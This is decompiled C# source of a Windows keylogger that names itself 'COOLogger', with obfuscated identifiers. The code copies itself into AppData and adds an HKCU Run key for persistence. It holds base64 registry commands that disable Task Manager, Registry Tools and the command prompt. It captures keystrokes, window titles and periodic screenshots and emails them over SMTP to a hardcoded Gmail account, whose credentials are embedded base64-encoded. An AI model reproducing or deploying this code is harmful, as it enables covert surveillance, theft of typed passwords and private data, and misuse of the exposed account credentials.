using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class IzZogRyBVxDQbvJ
{
	private static string wiKgfHoGrvWwICU = "aGF0YWtlYnJvQGdtYWlsLmNvbQ==";

	private static string RnKiaWiyOjXgEyc = "a2lsbGpveTMy";

	private static string eLekshNWXVaxEMp = "smtp.gmail.com";

	private static int DCSWYQpFwhPRlOT = 587;

	private static string KjyrbJMgJNblHUH;

	private static string tUqpSzRDHgHSMeb;

	private static string xUskgsKYthqOJmo;

	private static string VpuDsYhhfkIPWBN;

	private static string NcgjbzPIrZcwZdr;

	private static string cRwGHFKunuZmlCG;

	private static int NYSkTqakqmyPeln = 600000;

	private static string IdqFmEptTIFyROl = null;

	private static string PTWOmCueMPjMQeo = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string KXKwYusVDUGKjKV = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string PheCXvnkvNbwktS = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object hdMZyzajvYrWuNm = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string wUPsubhBJxeZZYd = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage OVcsTSiYbTrVzxf = new MailMessage();

	private static SmtpClient XDmiXrhYmwffSFf = new SmtpClient();

	[AccessedThroughProperty("QBvkFvmzKtsgStQ")]
	private static CPdLcOSrgdXpmJf _QBvkFvmzKtsgStQ;

	private static object epsIdeoxsWlFZrm = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox WyeOKyTJzOYHHtg = new RichTextBox();

	private static CPdLcOSrgdXpmJf QBvkFvmzKtsgStQ
	{
		get
		{
			return _QBvkFvmzKtsgStQ;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_QBvkFvmzKtsgStQ != null)
			{
				CPdLcOSrgdXpmJf.KeyDown -= rumLaTDknIkoDNi;
			}
			_QBvkFvmzKtsgStQ = value;
			if (_QBvkFvmzKtsgStQ != null)
			{
				CPdLcOSrgdXpmJf.KeyDown += rumLaTDknIkoDNi;
			}
		}
	} = new CPdLcOSrgdXpmJf();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		cRwGHFKunuZmlCG = Conversions.ToString(true);
		xUskgsKYthqOJmo = Conversions.ToString(false);
		VpuDsYhhfkIPWBN = Conversions.ToString(false);
		NcgjbzPIrZcwZdr = Conversions.ToString(false);
		tUqpSzRDHgHSMeb = Conversions.ToString(false);
		KjyrbJMgJNblHUH = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, hdMZyzajvYrWuNm, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(hdMZyzajvYrWuNm, (object)"\\VcsTSiYbTrVzxfU.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(wUPsubhBJxeZZYd + "\\VcsTSiYbTrVzxfU.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(hdMZyzajvYrWuNm, (object)"\\"), epsIdeoxsWlFZrm))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(hdMZyzajvYrWuNm, (object)"\\"), epsIdeoxsWlFZrm)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(hdMZyzajvYrWuNm, (object)"\\"), epsIdeoxsWlFZrm)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(hdMZyzajvYrWuNm, (object)"\\"), epsIdeoxsWlFZrm)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(hdMZyzajvYrWuNm, (object)"\\"), epsIdeoxsWlFZrm) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(KjyrbJMgJNblHUH))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(epsIdeoxsWlFZrm)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(epsIdeoxsWlFZrm), Operators.ConcatenateObject(Operators.ConcatenateObject(hdMZyzajvYrWuNm, (object)"\\"), epsIdeoxsWlFZrm));
			}
		}
		if (Conversions.ToBoolean(tUqpSzRDHgHSMeb))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(hdMZyzajvYrWuNm, (object)"\\VcsTSiYbTrVzxfU.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(xUskgsKYthqOJmo))
		{
			Interaction.Shell(viVwSRtbseiIitn(PTWOmCueMPjMQeo), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(VpuDsYhhfkIPWBN))
		{
			Interaction.Shell(viVwSRtbseiIitn(KXKwYusVDUGKjKV), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(NcgjbzPIrZcwZdr))
		{
			Interaction.Shell(viVwSRtbseiIitn(PheCXvnkvNbwktS), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(600000);
		val.add_Tick((EventHandler)cqYpbfGtrlEBXsS_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)XTfixTUdniMbuOh_Ticked);
		val2.Start();
		QBvkFvmzKtsgStQ.EKGRVjFGQZUxOgB();
		Application.Run();
	}

	private static string gCENkSvLrxRZPup()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string viVwSRtbseiIitn(string cooFILDbqjTBEYB)
	{
		byte[] bytes = Convert.FromBase64String(cooFILDbqjTBEYB);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void cqYpbfGtrlEBXsS_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(cRwGHFKunuZmlCG))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = cvpfLUUTXJCJnzz(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(hdMZyzajvYrWuNm, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(hdMZyzajvYrWuNm, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(viVwSRtbseiIitn(wiKgfHoGrvWwICU));
				mailMessage.To.Add(viVwSRtbseiIitn(wiKgfHoGrvWwICU));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = WyeOKyTJzOYHHtg.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(viVwSRtbseiIitn(wiKgfHoGrvWwICU), viVwSRtbseiIitn(RnKiaWiyOjXgEyc));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				WyeOKyTJzOYHHtg.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage oVcsTSiYbTrVzxf = OVcsTSiYbTrVzxf;
		oVcsTSiYbTrVzxf.From = new MailAddress(viVwSRtbseiIitn(wiKgfHoGrvWwICU));
		oVcsTSiYbTrVzxf.To.Add(viVwSRtbseiIitn(wiKgfHoGrvWwICU));
		oVcsTSiYbTrVzxf.Subject = "COOLogger Logs from - " + Environment.UserName;
		oVcsTSiYbTrVzxf.Body = WyeOKyTJzOYHHtg.get_Text();
		oVcsTSiYbTrVzxf = null;
		SmtpClient xDmiXrhYmwffSFf = XDmiXrhYmwffSFf;
		xDmiXrhYmwffSFf.Host = "smtp.gmail.com";
		xDmiXrhYmwffSFf.Port = 587;
		xDmiXrhYmwffSFf.EnableSsl = true;
		xDmiXrhYmwffSFf.Credentials = new NetworkCredential(viVwSRtbseiIitn(wiKgfHoGrvWwICU), viVwSRtbseiIitn(RnKiaWiyOjXgEyc));
		xDmiXrhYmwffSFf.Send(OVcsTSiYbTrVzxf);
		xDmiXrhYmwffSFf = null;
		WyeOKyTJzOYHHtg.set_Text("");
	}

	public static void rumLaTDknIkoDNi(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox wyeOKyTJzOYHHtg = WyeOKyTJzOYHHtg;
		wyeOKyTJzOYHHtg.set_Text(wyeOKyTJzOYHHtg.get_Text() + QBvkFvmzKtsgStQ.UOEjssqvhahMYYn(e));
	}

	public static void XTfixTUdniMbuOh_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(IdqFmEptTIFyROl, gCENkSvLrxRZPup(), false) != 0)
		{
			IdqFmEptTIFyROl = gCENkSvLrxRZPup();
			if (Operators.CompareString(IdqFmEptTIFyROl, "", false) != 0)
			{
				RichTextBox wyeOKyTJzOYHHtg = WyeOKyTJzOYHHtg;
				wyeOKyTJzOYHHtg.set_Text(wyeOKyTJzOYHHtg.get_Text() + "\r\n\r\n~~~~~" + IdqFmEptTIFyROl + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string cvpfLUUTXJCJnzz(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
